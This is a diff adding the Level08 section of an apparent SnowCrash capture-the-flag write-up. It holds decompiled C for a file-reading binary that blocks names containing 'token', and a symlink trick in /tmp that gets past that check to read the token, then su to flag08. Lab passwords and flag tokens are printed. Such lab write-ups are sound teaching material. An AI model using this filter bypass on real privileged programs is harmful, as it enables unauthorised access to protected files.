@@ -491,3 +491,85 @@ Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
 
 ### Level08
 
+Same as before, we get a binary file. When decompiling ot we get :
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <err.h>
+
+int main(int argc, char **argv, char **envp)
+{
+    char buf[1024];
+    int fd;
+    int rc;
+    
+    // Stack canary check is handled by compiler flag -fstack-protector
+    
+    // Check if argc is not 2
+    if (argc != 2) {
+        printf("%s [file to read]\n", argv[0]);
+        exit(1);
+    }
+    
+    // Check if argv[1] contains "token"
+    if (strstr(argv[1], "token") != NULL) {
+        printf("You may not access '%s'\n", argv[1]);
+        exit(1);
+    }
+    
+    // Open the file
+    fd = open(argv[1], O_RDONLY);
+    if (fd == -1) {
+        err(1, "Unable to open %s", argv[1]);
+    }
+    
+    // Read from file
+    rc = read(fd, buf, sizeof(buf));
+    if (rc == -1) {
+        err(1, "Unable to read fd %d", fd);
+    }
+    
+    // Write to stdout
+    write(1, buf, rc);
+    
+    return 0;
+}
+```
+
+Confirming the functions use in this binary using `nnm -u` :
+```
+nm -u >> strstr
+         open
+         exit
+         read
+         write
+         err
+
+```
+
+The function that we can notice is `strstr` which is the most susceptible to have a vunerability by the way is build.
+We tried several things but nothing was conclusive.
+
+The next lead was finding a file or directoy we could open, but the binary could. We found this :
+```
+level08@SnowCrash:~$ env | grep FULL
+FULL_PATH=/home/user/level08/token
+```
+
+We tried creating a sym link :
+```
+level08@SnowCrash:~$ ln -s "$FULL_PATH" /tmp/secret_file
+level08@SnowCrash:~$ ./level08 /tmp/secret_file
+quif5eloekouj29ke0vouxean
+su flag08
+Password: 
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+```
+
+### Level09
+
